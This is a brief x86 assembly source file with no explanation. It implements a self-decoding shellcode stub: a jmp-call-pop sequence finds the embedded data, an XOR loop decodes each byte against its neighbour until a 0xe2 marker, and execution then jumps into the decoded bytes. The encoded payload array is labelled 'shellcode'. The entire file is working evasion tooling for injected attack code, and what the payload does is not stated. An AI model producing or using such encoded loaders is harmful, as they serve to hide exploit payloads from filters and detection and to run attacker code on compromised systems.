    global _start

    section prog write exec

    _start:
            jmp short getpc

    start_decoder:
            pop esi
    decoder:
            mov bl, [esi+1]
            xor [esi], bl
            inc esi
            cmp byte [esi-1], 0xe2
            jnz decoder
	    jmp short shellcode

    getpc:
            call start_decoder
            shellcode: db 0xd9,0xe8,0x28,0x78,0x10,0x72,0x13,0x60,0x08,0x60,0x02,0x6b,0x05,0x2a,0x42,0x6d,0x42,0x6d,0x42,0xcb,0x28,0x78,0xf1,0x13,0x40,0xc9,0x28,0x98,0x93,0x5e,0xde,0xe2